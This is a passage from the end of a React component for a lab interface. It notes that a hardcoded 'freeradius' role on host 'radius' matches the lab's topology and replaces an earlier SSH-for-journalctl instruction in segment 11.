              <code className="mono">freeradius</code> role, hardcoded to hostname <code className="mono">radius</code>{" "}
              — matches this lab&apos;s documented topology. Shown only for segment 11, where it replaces the old
              &quot;SSH into radius for journalctl&quot; instruction.
            </div>
          </div>
        )}
      </div>
    </main>
  );
}
